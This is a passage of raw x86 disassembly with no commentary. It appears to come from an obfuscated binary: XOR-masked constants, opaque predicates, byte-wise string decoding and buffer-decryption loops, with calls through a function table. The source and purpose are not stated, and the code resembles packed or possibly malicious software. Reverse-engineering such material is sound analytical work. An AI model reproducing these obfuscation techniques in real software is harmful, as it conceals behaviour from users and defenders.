  41dfbc:	mov    DWORD PTR [ebp-0x38],0xf89c8582
  41dfc3:	mov    DWORD PTR [ebp-0x1c],edi
  41dfc6:	mov    eax,DWORD PTR [ebp-0x24]
  41dfc9:	xor    eax,ebx
  41dfcb:	add    eax,esi
  41dfcd:	jmp    0x41e0c3
  41dfd2:	mov    DWORD PTR [ebp-0xe0],0xf89c85bb
  41dfdc:	mov    DWORD PTR [ebp-0xc4],0xf89c85ad
  41dfe6:	mov    eax,DWORD PTR [ebp-0x1c]
  41dfe9:	mov    ecx,DWORD PTR [ebp-0x48]
  41dfec:	xor    eax,ebx
  41dfee:	add    eax,esi
  41dff0:	imul   eax,ecx
  41dff3:	mov    ecx,DWORD PTR [ebp-0x8]
  41dff6:	mov    al,BYTE PTR [eax+ecx*1]
  41dff9:	mov    BYTE PTR [ebp-0x2],al
  41dffc:	mov    eax,DWORD PTR [ebp-0x1c]
  41dfff:	mov    ecx,DWORD PTR [ebp-0x48]
  41e002:	xor    eax,ebx
  41e004:	add    eax,esi
  41e006:	imul   eax,ecx
  41e009:	mov    ecx,DWORD PTR [ebp-0xe8]
  41e00f:	xor    ecx,ebx
  41e011:	add    eax,ecx
  41e013:	mov    ecx,DWORD PTR [ebp-0x8]
  41e016:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e4]
  41e01e:	mov    ecx,DWORD PTR [ebp-0xe0]
  41e024:	xor    ecx,ebx
  41e026:	lea    eax,[ecx+eax*1+0x3272e4]
  41e02d:	movzx  ecx,BYTE PTR [ebp-0x2]
  41e031:	xor    ecx,eax
  41e033:	mov    BYTE PTR [ebp-0x2],cl
  41e036:	mov    al,BYTE PTR [ebp-0x2]
  41e039:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e03c:	mov    edx,DWORD PTR [ebp-0x48]
  41e03f:	xor    ecx,ebx
  41e041:	add    ecx,esi
  41e043:	imul   ecx,edx
  41e046:	mov    edx,DWORD PTR [ebp-0x8]
  41e049:	mov    BYTE PTR [ecx+edx*1],al
  41e04c:	mov    eax,DWORD PTR [ebp-0x1c]
  41e04f:	mov    ecx,DWORD PTR [ebp-0x48]
  41e052:	xor    eax,ebx
  41e054:	add    eax,esi
  41e056:	imul   eax,ecx
  41e059:	mov    ecx,DWORD PTR [ebp-0x8]
  41e05c:	mov    al,BYTE PTR [eax+ecx*1]
  41e05f:	mov    BYTE PTR [ebp-0x2],al
  41e062:	mov    eax,DWORD PTR [ebp-0x1c]
  41e065:	mov    ecx,DWORD PTR [ebp-0x48]
  41e068:	xor    eax,ebx
  41e06a:	add    eax,esi
  41e06c:	imul   eax,ecx
  41e06f:	mov    ecx,DWORD PTR [ebp-0x20]
  41e072:	xor    ecx,ebx
  41e074:	add    eax,ecx
  41e076:	mov    ecx,DWORD PTR [ebp-0x8]
  41e079:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e4]
  41e081:	mov    ecx,DWORD PTR [ebp-0xc4]
  41e087:	xor    ecx,ebx
  41e089:	lea    eax,[ecx+eax*1+0x3272e4]
  41e090:	movzx  ecx,BYTE PTR [ebp-0x2]
  41e094:	xor    ecx,eax
  41e096:	mov    BYTE PTR [ebp-0x2],cl
  41e099:	mov    al,BYTE PTR [ebp-0x2]
  41e09c:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e09f:	mov    edx,DWORD PTR [ebp-0x48]
  41e0a2:	xor    ecx,ebx
  41e0a4:	add    ecx,esi
  41e0a6:	imul   ecx,edx
  41e0a9:	mov    edx,DWORD PTR [ebp-0x8]
  41e0ac:	mov    BYTE PTR [ecx+edx*1],al
  41e0af:	mov    eax,DWORD PTR [ebp-0x38]
  41e0b2:	mov    ecx,DWORD PTR [ebp-0x20]
  41e0b5:	xor    eax,ebx
  41e0b7:	xor    ecx,ebx
  41e0b9:	add    eax,esi
  41e0bb:	add    ecx,esi
  41e0bd:	imul   eax,ecx
  41e0c0:	add    eax,DWORD PTR [ebp-0x48]
  41e0c3:	mov    DWORD PTR [ebp-0x48],eax
  41e0c6:	mov    eax,DWORD PTR [ebp-0x48]
  41e0c9:	mov    ecx,DWORD PTR [ebp-0x14]
  41e0cc:	cmp    ecx,eax
  41e0ce:	jb     0x41dfd2
  41e0d4:	mov    eax,DWORD PTR [ebp-0x20]
  41e0d7:	mov    ecx,DWORD PTR [ebp-0x14]
  41e0da:	xor    eax,ebx
  41e0dc:	add    eax,esi
  41e0de:	imul   eax,ecx
  41e0e1:	mov    ecx,DWORD PTR [ebp-0x24]
  41e0e4:	xor    ecx,ebx
  41e0e6:	add    ecx,esi
  41e0e8:	or     eax,ecx
  41e0ea:	mov    ecx,DWORD PTR [ebp-0x30]
  41e0ed:	xor    ecx,ebx
  41e0ef:	add    eax,ecx
  41e0f1:	mov    ecx,DWORD PTR [ebp-0x30]
  41e0f4:	xor    ecx,ebx
  41e0f6:	add    eax,ecx
  41e0f8:	mov    ecx,DWORD PTR [ebp-0xc]
  41e0fb:	lea    eax,[eax+ecx*1+0x64e5c8]
  41e102:	jmp    0x41e113
  41e104:	mov    eax,DWORD PTR [ebp-0x30]
  41e107:	mov    ecx,DWORD PTR [ebp-0xc]
  41e10a:	xor    eax,ebx
  41e10c:	lea    eax,[eax+ecx*1+0x3272e4]
  41e113:	mov    DWORD PTR [ebp-0xc],eax
  41e116:	mov    eax,DWORD PTR [ebp-0x30]
  41e119:	xor    eax,ebx
  41e11b:	mov    ecx,0xffcd8d1c
  41e120:	sub    ecx,eax
  41e122:	add    ecx,DWORD PTR [ebp-0x28]
  41e125:	mov    eax,DWORD PTR [ebp-0x30]
  41e128:	mov    edx,DWORD PTR [ebp-0xc]
  41e12b:	xor    eax,ebx
  41e12d:	add    eax,esi
  41e12f:	imul   eax,edx
  41e132:	cmp    eax,ecx
  41e134:	jbe    0x41df46
  41e13a:	mov    eax,DWORD PTR [ebp-0x10]
  41e13d:	mov    ecx,DWORD PTR [ebp-0x3c]
  41e140:	mov    eax,DWORD PTR [ebp+0x8]
  41e143:	mov    edx,DWORD PTR [ebp-0x54]
  41e146:	mov    eax,DWORD PTR [eax+0x1d8]
  41e14c:	xor    edx,ebx
  41e14e:	add    edx,esi
  41e150:	push   edx
  41e151:	mov    edx,DWORD PTR [ebp-0x40]
  41e154:	xor    edx,ebx
  41e156:	add    edx,esi
  41e158:	push   edx
  41e159:	push   ecx
  41e15a:	mov    DWORD PTR [ebp-0x38],ecx
  41e15d:	mov    ecx,DWORD PTR [ebp-0x10]
  41e160:	xor    ecx,ebx
  41e162:	add    ecx,esi
  41e164:	push   ecx
  41e165:	call   DWORD PTR [eax+0x14]
  41e168:	mov    edi,eax
  41e16a:	mov    eax,DWORD PTR [ebp-0x10]
  41e16d:	xor    eax,ebx
  41e16f:	add    eax,esi
  41e171:	cmp    eax,edi
  41e173:	je     0x41e1ce
  41e175:	mov    eax,DWORD PTR [ebp-0x10]
  41e178:	jmp    0x41e19b
  41e17a:	mov    ecx,DWORD PTR [ebp-0x2c]
  41e17d:	xor    eax,ebx
  41e17f:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e4]
  41e186:	mov    BYTE PTR [eax+edi*1+0x3272e4],cl
  41e18d:	mov    ecx,DWORD PTR [ebp-0x18]
  41e190:	xor    ecx,ebx
  41e192:	lea    eax,[ecx+eax*1+0x3272e4]
  41e199:	xor    eax,ebx
  41e19b:	mov    ecx,DWORD PTR [ebp-0x3c]
  41e19e:	sub    ecx,esi
  41e1a0:	xor    ecx,ebx
  41e1a2:	cmp    eax,ecx
  41e1a4:	jne    0x41e17a
  41e1a6:	mov    eax,DWORD PTR [ebp+0x8]
  41e1a9:	mov    ecx,DWORD PTR [ebp-0x50]
  41e1ac:	mov    eax,DWORD PTR [eax+0x1d8]
  41e1b2:	xor    ecx,ebx
  41e1b4:	add    ecx,esi
  41e1b6:	push   ecx
  41e1b7:	mov    ecx,DWORD PTR [ebp-0x10]
  41e1ba:	xor    ecx,ebx
  41e1bc:	add    ecx,esi
  41e1be:	push   ecx
  41e1bf:	push   DWORD PTR [ebp-0x2c]
  41e1c2:	call   DWORD PTR [eax+0x18]
  41e1c5:	mov    eax,DWORD PTR [ebp-0x38]
  41e1c8:	mov    DWORD PTR [ebp-0x2c],edi
  41e1cb:	mov    DWORD PTR [ebp-0x3c],eax
  41e1ce:	mov    eax,DWORD PTR [ebp-0x2c]
  41e1d1:	mov    DWORD PTR [ebp-0x14],eax
  41e1d4:	mov    eax,DWORD PTR [ebp-0x18]
  41e1d7:	mov    ecx,DWORD PTR [ebp-0x10]
  41e1da:	xor    eax,ebx
  41e1dc:	add    eax,esi
  41e1de:	mov    DWORD PTR [ebp-0x5c],0x3d2a222a
  41e1e5:	mov    DWORD PTR [ebp-0x58],0x272a3f2a
  41e1ec:	jmp    0x41e21f
  41e1ee:	mov    edx,DWORD PTR [ebp-0x14]
  41e1f1:	mov    edi,ecx
  41e1f3:	xor    edi,ebx
  41e1f5:	mov    cl,BYTE PTR [ebp+edi*1+0x327288]
  41e1fc:	movsx  edx,BYTE PTR [edi+edx*1+0x3272e4]
  41e204:	xor    cl,0x75
  41e207:	sub    cl,0x7
  41e20a:	movzx  ecx,cl
  41e20d:	cmp    edx,ecx
  41e20f:	jne    0x41e229
  41e211:	mov    ecx,DWORD PTR [ebp-0x18]
  41e214:	xor    ecx,ebx
  41e216:	lea    ecx,[ecx+edi*1+0x3272e4]
  41e21d:	xor    ecx,ebx
  41e21f:	cmp    ecx,0xf89c85b9
  41e225:	jne    0x41e1ee
  41e227:	jmp    0x41e230
  41e229:	mov    eax,DWORD PTR [ebp-0x10]
  41e22c:	xor    eax,ebx
  41e22e:	add    eax,esi
  41e230:	mov    ecx,DWORD PTR [ebp-0x10]
  41e233:	xor    ecx,ebx
  41e235:	add    ecx,esi
  41e237:	cmp    ecx,eax
  41e239:	je     0x41e3af
  41e23f:	mov    eax,DWORD PTR [ebp-0x14]
  41e242:	mov    eax,DWORD PTR [eax+0x8]
  41e245:	mov    DWORD PTR [ebp-0xc],0xf89c8581
  41e24c:	mov    DWORD PTR [ebp-0x40],0xf89cc316
  41e253:	mov    DWORD PTR [ebp-0x44],0xf89cb581
  41e25a:	mov    DWORD PTR [ebp-0x24],0xf89c85bd
  41e261:	mov    DWORD PTR [ebp-0x20],eax
  41e264:	mov    eax,DWORD PTR [ebp+0x8]
  41e267:	mov    ecx,DWORD PTR [ebp-0x24]
  41e26a:	xor    ecx,ebx
  41e26c:	add    ecx,esi
  41e26e:	push   ecx
  41e26f:	mov    ecx,DWORD PTR [ebp-0x44]
  41e272:	mov    eax,DWORD PTR [eax+0x1d8]
  41e278:	xor    ecx,ebx
  41e27a:	add    ecx,esi
  41e27c:	push   ecx
  41e27d:	mov    ecx,DWORD PTR [ebp-0x40]
  41e280:	xor    ecx,ebx
  41e282:	add    ecx,esi
  41e284:	push   ecx
  41e285:	mov    ecx,DWORD PTR [ebp-0xc]
  41e288:	xor    ecx,ebx
  41e28a:	add    ecx,esi
  41e28c:	push   ecx
  41e28d:	call   DWORD PTR [eax+0x14]
  41e290:	mov    edi,eax
  41e292:	mov    eax,DWORD PTR [ebp+0x8]
  41e295:	mov    ecx,DWORD PTR [ebp-0x24]
  41e298:	mov    eax,DWORD PTR [eax+0x1d8]
  41e29e:	xor    ecx,ebx
  41e2a0:	add    ecx,esi
  41e2a2:	push   ecx
  41e2a3:	mov    ecx,DWORD PTR [ebp-0x44]
  41e2a6:	xor    ecx,ebx
  41e2a8:	add    ecx,esi
  41e2aa:	push   ecx
  41e2ab:	mov    ecx,DWORD PTR [ebp-0xc]
  41e2ae:	push   DWORD PTR [ebp-0x20]
  41e2b1:	xor    ecx,ebx
  41e2b3:	add    ecx,esi
  41e2b5:	push   ecx
  41e2b6:	call   DWORD PTR [eax+0x14]
  41e2b9:	mov    ecx,DWORD PTR [ebp-0xc]
  41e2bc:	xor    ecx,ebx
  41e2be:	add    ecx,esi
  41e2c0:	mov    DWORD PTR [ebp-0x24],eax
  41e2c3:	cmp    ecx,edi
  41e2c5:	je     0x41e652
  41e2cb:	mov    ecx,DWORD PTR [ebp-0xc]
  41e2ce:	xor    ecx,ebx
  41e2d0:	add    ecx,esi
  41e2d2:	cmp    ecx,eax
  41e2d4:	je     0x41e652
  41e2da:	mov    DWORD PTR [ebp-0x40],0xf89c8582
  41e2e1:	mov    DWORD PTR [ebp-0x54],0xf89c8583
  41e2e8:	mov    ecx,DWORD PTR [ebp-0x40]
  41e2eb:	xor    cl,0x9d
  41e2ee:	sub    cl,0x1c
  41e2f1:	mov    BYTE PTR [edi],cl
  41e2f3:	mov    ecx,DWORD PTR [ebp-0xc]
  41e2f6:	xor    cl,0x9d
  41e2f9:	sub    cl,0x1c
  41e2fc:	mov    BYTE PTR [edi+0x1],cl
  41e2ff:	mov    ecx,DWORD PTR [ebp-0x54]
  41e302:	xor    cl,0x9d
  41e305:	sub    cl,0x1c
  41e308:	mov    BYTE PTR [edi+0x2],cl
  41e30b:	and    DWORD PTR [ebp-0xc8],0x0
  41e312:	and    DWORD PTR [ebp-0xdc],0x0
  41e319:	lea    ecx,[ebp-0xdc]
  41e31f:	push   ecx
  41e320:	push   DWORD PTR [ebp-0x20]
  41e323:	push   eax
  41e324:	lea    eax,[ebp-0xc8]
  41e32a:	push   eax
  41e32b:	mov    eax,DWORD PTR [ebp-0x14]
  41e32e:	push   DWORD PTR [eax+0xc]
  41e331:	mov    eax,DWORD PTR [ebp-0x2c]
  41e334:	add    eax,0x10
  41e337:	push   eax
  41e338:	push   edi
  41e339:	call   0x41d5dd
  41e33e:	mov    DWORD PTR [ebp-0x40],eax
  41e341:	mov    eax,DWORD PTR [ebp+0x8]
  41e344:	mov    ecx,DWORD PTR [ebp-0x50]
  41e347:	mov    eax,DWORD PTR [eax+0x1d8]
  41e34d:	xor    ecx,ebx
  41e34f:	add    ecx,esi
  41e351:	push   ecx
  41e352:	mov    ecx,DWORD PTR [ebp-0xc]
  41e355:	xor    ecx,ebx
  41e357:	add    ecx,esi
  41e359:	push   ecx
  41e35a:	push   edi
  41e35b:	call   DWORD PTR [eax+0x18]
  41e35e:	mov    eax,DWORD PTR [ebp-0x40]
  41e361:	add    eax,0xffcd8d1c
  41e366:	xor    eax,ebx
  41e368:	cmp    eax,0xf89c8581
  41e36d:	mov    eax,DWORD PTR [ebp+0x8]
  41e370:	mov    eax,DWORD PTR [eax+0x1d8]
  41e376:	mov    ecx,DWORD PTR [ebp-0x50]
  41e379:	jne    0x41e39c
  41e37b:	xor    ecx,ebx
  41e37d:	add    ecx,esi
  41e37f:	push   ecx
  41e380:	mov    ecx,DWORD PTR [ebp-0xc]
  41e383:	xor    ecx,ebx
  41e385:	add    ecx,esi
  41e387:	push   ecx
  41e388:	push   DWORD PTR [ebp-0x2c]
  41e38b:	call   DWORD PTR [eax+0x18]
  41e38e:	mov    eax,DWORD PTR [ebp-0x24]
  41e391:	mov    DWORD PTR [ebp-0x2c],eax
  41e394:	mov    eax,DWORD PTR [ebp-0x20]
  41e397:	mov    DWORD PTR [ebp-0x3c],eax
  41e39a:	jmp    0x41e3af
  41e39c:	xor    ecx,ebx
  41e39e:	add    ecx,esi
  41e3a0:	push   ecx
  41e3a1:	mov    ecx,DWORD PTR [ebp-0xc]
  41e3a4:	xor    ecx,ebx
  41e3a6:	add    ecx,esi
  41e3a8:	push   ecx
  41e3a9:	push   DWORD PTR [ebp-0x24]
  41e3ac:	call   DWORD PTR [eax+0x18]
  41e3af:	mov    eax,DWORD PTR [ebp-0x3c]
  41e3b2:	mov    DWORD PTR [ebp-0x34],eax
  41e3b5:	mov    eax,DWORD PTR [ebp-0x2c]
  41e3b8:	mov    DWORD PTR [ebp-0x28],0xf89c8581
  41e3bf:	mov    DWORD PTR [ebp-0x40],eax
  41e3c2:	mov    edi,0xf89c8580
  41e3c7:	mov    DWORD PTR [ebp-0x30],edi
  41e3ca:	mov    eax,DWORD PTR [ebp-0x28]
  41e3cd:	xor    eax,ebx
  41e3cf:	add    eax,esi
  41e3d1:	mov    DWORD PTR [ebp-0xc],eax
  41e3d4:	mov    eax,DWORD PTR [ebp-0x28]
  41e3d7:	xor    eax,ebx
  41e3d9:	add    eax,esi
  41e3db:	mov    DWORD PTR [ebp-0x14],eax
  41e3de:	mov    DWORD PTR [ebp-0x44],0xf89c85a1
  41e3e5:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  41e3ec:	mov    eax,DWORD PTR [ebp-0x28]
  41e3ef:	mov    ecx,DWORD PTR [ebp-0x34]
  41e3f2:	xor    eax,ebx
  41e3f4:	add    eax,esi
  41e3f6:	cmp    ecx,eax
  41e3f8:	je     0x41e5ee
  41e3fe:	jmp    0x41e5ca
  41e403:	mov    ecx,DWORD PTR [ebp-0xc]
  41e406:	mov    eax,DWORD PTR [ebp-0x34]
  41e409:	sub    eax,ecx
  41e40b:	mov    ecx,DWORD PTR [ebp-0x44]
  41e40e:	xor    ecx,ebx
  41e410:	add    ecx,esi
  41e412:	xor    edx,edx
  41e414:	div    ecx
  41e416:	mov    DWORD PTR [ebp-0x14],eax
  41e419:	mov    eax,DWORD PTR [ebp-0x24]
  41e41c:	mov    ecx,DWORD PTR [ebp-0x14]
  41e41f:	xor    eax,ebx
  41e421:	add    eax,esi
  41e423:	cmp    ecx,eax
  41e425:	jbe    0x41e431
  41e427:	mov    eax,DWORD PTR [ebp-0x24]
  41e42a:	xor    eax,ebx
  41e42c:	add    eax,esi
  41e42e:	mov    DWORD PTR [ebp-0x14],eax
  41e431:	mov    eax,DWORD PTR [ebp-0x44]
  41e434:	mov    ecx,DWORD PTR [ebp-0x14]
  41e437:	xor    eax,ebx
  41e439:	add    eax,esi
  41e43b:	imul   eax,ecx
  41e43e:	mov    DWORD PTR [ebp-0x14],eax
  41e441:	mov    eax,DWORD PTR [ebp-0x28]
  41e444:	mov    ecx,DWORD PTR [ebp-0x14]
  41e447:	xor    eax,ebx
  41e449:	add    eax,esi
  41e44b:	cmp    ecx,eax
  41e44d:	je     0x41e5b8
  41e453:	mov    eax,DWORD PTR [ebp-0x14]
  41e456:	mov    DWORD PTR [ebp-0x20],eax
  41e459:	mov    eax,DWORD PTR [ebp-0xc]
  41e45c:	add    eax,DWORD PTR [ebp-0x40]
  41e45f:	mov    DWORD PTR [ebp-0x4c],0xf89c8581
  41e466:	mov    DWORD PTR [ebp-0x14],edi
  41e469:	mov    DWORD PTR [ebp-0x54],0xf89c8583
  41e470:	mov    DWORD PTR [ebp-0x1c],eax
  41e473:	mov    DWORD PTR [ebp-0x38],0xf89c8582
  41e47a:	mov    DWORD PTR [ebp-0x8],edi
  41e47d:	mov    eax,DWORD PTR [ebp-0x4c]
  41e480:	xor    eax,ebx
  41e482:	add    eax,esi
  41e484:	jmp    0x41e577
  41e489:	mov    DWORD PTR [ebp-0xe4],0xf89c85bb
  41e493:	mov    DWORD PTR [ebp-0xd0],0xf89c85ad
  41e49d:	mov    eax,DWORD PTR [ebp-0x8]
  41e4a0:	mov    ecx,DWORD PTR [ebp-0x18]
  41e4a3:	xor    eax,ebx
  41e4a5:	add    eax,esi
  41e4a7:	imul   eax,ecx
  41e4aa:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e4ad:	mov    al,BYTE PTR [eax+ecx*1]
  41e4b0:	mov    BYTE PTR [ebp-0x1],al
  41e4b3:	mov    eax,DWORD PTR [ebp-0x8]
  41e4b6:	mov    ecx,DWORD PTR [ebp-0x18]
  41e4b9:	xor    eax,ebx
  41e4bb:	add    eax,esi
  41e4bd:	imul   eax,ecx
  41e4c0:	mov    ecx,DWORD PTR [ebp-0x54]
  41e4c3:	xor    ecx,ebx
  41e4c5:	add    eax,ecx
  41e4c7:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e4ca:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e4]
  41e4d2:	mov    ecx,DWORD PTR [ebp-0xe4]
  41e4d8:	xor    ecx,ebx
  41e4da:	lea    eax,[ecx+eax*1+0x3272e4]
  41e4e1:	movzx  ecx,BYTE PTR [ebp-0x1]
  41e4e5:	xor    ecx,eax
  41e4e7:	mov    BYTE PTR [ebp-0x1],cl
  41e4ea:	mov    al,BYTE PTR [ebp-0x1]
  41e4ed:	mov    ecx,DWORD PTR [ebp-0x8]
  41e4f0:	mov    edx,DWORD PTR [ebp-0x18]
  41e4f3:	xor    ecx,ebx
  41e4f5:	add    ecx,esi
  41e4f7:	imul   ecx,edx
  41e4fa:	mov    edx,DWORD PTR [ebp-0x1c]
  41e4fd:	mov    BYTE PTR [ecx+edx*1],al
  41e500:	mov    eax,DWORD PTR [ebp-0x8]
  41e503:	mov    ecx,DWORD PTR [ebp-0x18]
  41e506:	xor    eax,ebx
  41e508:	add    eax,esi
  41e50a:	imul   eax,ecx
  41e50d:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e510:	mov    al,BYTE PTR [eax+ecx*1]
  41e513:	mov    BYTE PTR [ebp-0x1],al
  41e516:	mov    eax,DWORD PTR [ebp-0x8]
  41e519:	mov    ecx,DWORD PTR [ebp-0x18]
  41e51c:	xor    eax,ebx
  41e51e:	add    eax,esi
  41e520:	imul   eax,ecx
  41e523:	mov    ecx,DWORD PTR [ebp-0x14]
  41e526:	xor    ecx,ebx
  41e528:	add    eax,ecx
  41e52a:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e52d:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e4]
  41e535:	mov    ecx,DWORD PTR [ebp-0xd0]
  41e53b:	xor    ecx,ebx
  41e53d:	lea    eax,[ecx+eax*1+0x3272e4]
  41e544:	movzx  ecx,BYTE PTR [ebp-0x1]
  41e548:	xor    ecx,eax
  41e54a:	mov    BYTE PTR [ebp-0x1],cl
  41e54d:	mov    al,BYTE PTR [ebp-0x1]
  41e550:	mov    ecx,DWORD PTR [ebp-0x8]
  41e553:	mov    edx,DWORD PTR [ebp-0x18]
  41e556:	xor    ecx,ebx
  41e558:	add    ecx,esi
  41e55a:	imul   ecx,edx
  41e55d:	mov    edx,DWORD PTR [ebp-0x1c]
  41e560:	mov    BYTE PTR [ecx+edx*1],al
  41e563:	mov    eax,DWORD PTR [ebp-0x38]
  41e566:	mov    ecx,DWORD PTR [ebp-0x14]
  41e569:	xor    eax,ebx
  41e56b:	xor    ecx,ebx
  41e56d:	add    eax,esi
  41e56f:	add    ecx,esi
  41e571:	imul   eax,ecx
  41e574:	add    eax,DWORD PTR [ebp-0x18]
  41e577:	mov    DWORD PTR [ebp-0x18],eax
  41e57a:	mov    eax,DWORD PTR [ebp-0x18]
  41e57d:	mov    ecx,DWORD PTR [ebp-0x20]
  41e580:	cmp    ecx,eax
  41e582:	jb     0x41e489
  41e588:	mov    eax,DWORD PTR [ebp-0x14]
  41e58b:	mov    ecx,DWORD PTR [ebp-0x20]
  41e58e:	xor    eax,ebx
  41e590:	add    eax,esi
  41e592:	imul   eax,ecx
  41e595:	mov    ecx,DWORD PTR [ebp-0x4c]
  41e598:	xor    ecx,ebx
  41e59a:	add    ecx,esi
  41e59c:	or     eax,ecx
  41e59e:	mov    ecx,DWORD PTR [ebp-0x30]
  41e5a1:	xor    ecx,ebx
  41e5a3:	add    eax,ecx
  41e5a5:	mov    ecx,DWORD PTR [ebp-0x30]
  41e5a8:	xor    ecx,ebx
  41e5aa:	add    eax,ecx
  41e5ac:	mov    ecx,DWORD PTR [ebp-0xc]
  41e5af:	lea    eax,[eax+ecx*1+0x64e5c8]
  41e5b6:	jmp    0x41e5c7
  41e5b8:	mov    eax,DWORD PTR [ebp-0x30]
  41e5bb:	mov    ecx,DWORD PTR [ebp-0xc]
  41e5be:	xor    eax,ebx
  41e5c0:	lea    eax,[eax+ecx*1+0x3272e4]
  41e5c7:	mov    DWORD PTR [ebp-0xc],eax
  41e5ca:	mov    eax,DWORD PTR [ebp-0x30]
  41e5cd:	xor    eax,ebx
  41e5cf:	mov    ecx,0xffcd8d1c
  41e5d4:	sub    ecx,eax
  41e5d6:	add    ecx,DWORD PTR [ebp-0x34]
  41e5d9:	mov    eax,DWORD PTR [ebp-0x30]
  41e5dc:	mov    edx,DWORD PTR [ebp-0xc]
  41e5df:	xor    eax,ebx
  41e5e1:	add    eax,esi
  41e5e3:	imul   eax,edx
  41e5e6:	cmp    eax,ecx
  41e5e8:	jbe    0x41e403
  41e5ee:	push   DWORD PTR [ebp+0x8]
  41e5f1:	mov    eax,DWORD PTR [ebp+0x8]
  41e5f4:	push   DWORD PTR [eax+0x1cc]
  41e5fa:	lea    eax,[ebp-0xd8]
  41e600:	push   eax
  41e601:	mov    eax,DWORD PTR [ebp+0x8]
  41e604:	mov    eax,DWORD PTR [eax+0x1c4]
  41e60a:	push   DWORD PTR [eax]
  41e60c:	mov    eax,DWORD PTR [ebp+0x8]
  41e60f:	mov    eax,DWORD PTR [eax+0x1c0]
  41e615:	push   DWORD PTR [eax]
  41e617:	push   DWORD PTR [ebp-0x3c]
  41e61a:	push   DWORD PTR [ebp-0x2c]
  41e61d:	call   0x41f0b4
  41e622:	mov    DWORD PTR [ebp-0x40],eax
  41e625:	mov    eax,DWORD PTR [ebp-0x10]
  41e628:	mov    ecx,DWORD PTR [ebp-0x2c]
  41e62b:	xor    eax,ebx
  41e62d:	add    eax,esi
  41e62f:	cmp    eax,ecx
  41e631:	je     0x41e652
  41e633:	mov    eax,DWORD PTR [ebp+0x8]
  41e636:	mov    ecx,DWORD PTR [ebp-0x50]
  41e639:	mov    eax,DWORD PTR [eax+0x1d8]
  41e63f:	xor    ecx,ebx
  41e641:	add    ecx,esi
  41e643:	push   ecx
  41e644:	mov    ecx,DWORD PTR [ebp-0x10]
  41e647:	xor    ecx,ebx
  41e649:	add    ecx,esi
  41e64b:	push   ecx
  41e64c:	push   DWORD PTR [ebp-0x2c]
  41e64f:	call   DWORD PTR [eax+0x18]
  41e652:	pop    edi
  41e653:	pop    esi
  41e654:	pop    ebx
  41e655:	leave  
  41e656:	ret    0x4
  41e659:	push   ebp
  41e65a:	mov    ebp,esp
  41e65c:	push   ecx
  41e65d:	push   ecx
  41e65e:	lea    eax,[ebp-0x8]
  41e661:	mov    DWORD PTR [ebp-0x4],eax
  41e664:	push   esi
  41e665:	mov    esi,DWORD PTR [ebp-0x4]
  41e668:	mov    eax,0xf881ba0f
  41e66d:	mov    DWORD PTR [esi],eax
  41e66f:	mov    esi,DWORD PTR [ebp-0x8]
  41e672:	cmp    esi,eax
  41e674:	pop    esi
  41e675:	jne    0x41e67f
  41e677:	mov    BYTE PTR [ecx+0xa],0x72
  41e67b:	mov    BYTE PTR [edx+0x8],0x2f
  41e67f:	mov    BYTE PTR [edx+0xa],0x72
  41e683:	mov    BYTE PTR [ecx+0x2],0x0
  41e687:	leave  
  41e688:	ret    
  41e689:	push   ebp
  41e68a:	mov    ebp,esp
  41e68c:	push   ecx
  41e68d:	push   ecx
  41e68e:	lea    eax,[ebp-0x8]
  41e691:	mov    DWORD PTR [ebp-0x4],eax
  41e694:	mov    edx,DWORD PTR [ebp-0x4]
  41e697:	mov    eax,0xf88b0beb
  41e69c:	mov    DWORD PTR [edx],eax
  41e69e:	mov    edx,DWORD PTR [ebp-0x8]
  41e6a1:	cmp    edx,eax
  41e6a3:	jne    0x41e6b4
  41e6a5:	mov    eax,DWORD PTR [ebp+0x8]
  41e6a8:	mov    BYTE PTR [ecx+0x9],0xe
  41e6ac:	mov    BYTE PTR [eax+0x7],0x47
  41e6b0:	mov    BYTE PTR [ecx+0x6],0xf
  41e6b4:	mov    BYTE PTR [ecx+0x3],0x1e
  41e6b8:	leave  
  41e6b9:	ret    0x4
  41e6bc:	push   ebp
  41e6bd:	mov    ebp,esp
  41e6bf:	push   ecx
  41e6c0:	push   ecx
  41e6c1:	lea    eax,[ebp-0x8]
  41e6c4:	mov    DWORD PTR [ebp-0x4],eax
  41e6c7:	mov    edx,DWORD PTR [ebp-0x4]
  41e6ca:	mov    eax,0x7e0da0f
  41e6cf:	mov    DWORD PTR [edx],eax
  41e6d1:	mov    edx,DWORD PTR [ebp-0x8]
  41e6d4:	cmp    edx,eax
  41e6d6:	jne    0x41e6dc
  41e6d8:	mov    BYTE PTR [ecx+0x7],0x47
  41e6dc:	mov    eax,DWORD PTR [ebp+0x8]
  41e6df:	mov    BYTE PTR [ecx+0x1],0x5
  41e6e3:	mov    BYTE PTR [eax+0x9],0x2e
  41e6e7:	leave  
  41e6e8:	ret    0x4
  41e6eb:	push   ebp
  41e6ec:	mov    ebp,esp
  41e6ee:	push   ecx
  41e6ef:	push   ecx
  41e6f0:	lea    eax,[ebp-0x8]
  41e6f3:	mov    DWORD PTR [ebp-0x4],eax
  41e6f6:	push   esi
  41e6f7:	mov    esi,DWORD PTR [ebp-0x4]
  41e6fa:	mov    eax,0x7060e3e
  41e6ff:	mov    DWORD PTR [esi],eax
  41e701:	mov    esi,DWORD PTR [ebp-0x8]
  41e704:	cmp    esi,eax
  41e706:	pop    esi
  41e707:	jne    0x41e713
  41e709:	mov    BYTE PTR [edx+0x4],0x3
  41e70d:	mov    WORD PTR [ecx+0x3],0x31e
  41e713:	mov    BYTE PTR [edx],0x3f
  41e716:	leave  
  41e717:	ret    
  41e718:	push   ebp
  41e719:	mov    ebp,esp
  41e71b:	push   ecx
  41e71c:	push   ecx
  41e71d:	lea    eax,[ebp-0x8]
  41e720:	mov    DWORD PTR [ebp-0x4],eax
  41e723:	mov    edx,DWORD PTR [ebp-0x4]
  41e726:	mov    eax,0xf8870b3f
  41e72b:	mov    DWORD PTR [edx],eax
  41e72d:	mov    edx,DWORD PTR [ebp-0x8]
  41e730:	cmp    edx,eax
  41e732:	jne    0x41e73f
  41e734:	mov    eax,DWORD PTR [ebp+0x8]
